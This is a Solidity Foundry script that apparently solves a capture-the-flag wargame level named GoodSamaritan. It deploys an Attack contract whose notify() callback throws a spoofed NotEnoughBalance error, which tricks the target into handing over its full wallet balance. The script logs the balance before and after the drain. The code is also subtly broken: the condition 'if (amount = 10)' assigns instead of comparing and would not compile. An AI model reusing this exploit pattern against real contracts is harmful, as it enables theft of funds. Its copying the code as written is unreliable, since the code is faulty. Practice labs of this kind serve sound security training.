// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Level27.sol";

contract Level27Sol is Script {
    GoodSamaritan public instance =
        GoodSamaritan(0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log(
            "Balance of Wallet before attack",
            instance.coin().balances(address(instance.wallet()))
        );

        new Attack().exploit();

        console.log(
            "Balance of Wallet after attack",
            instance.coin().balances(address(instance.wallet()))
        );

        vm.stopBroadcast();
    }
}

contract Attack {
    error NotEnoughBalance();

    GoodSamaritan public instance =
        GoodSamaritan(0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6);

    function exploit() public {
        instance.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount = 10) {
            // only revert when receiving 10 coins
            revert NotEnoughBalance();
        }
    }
}
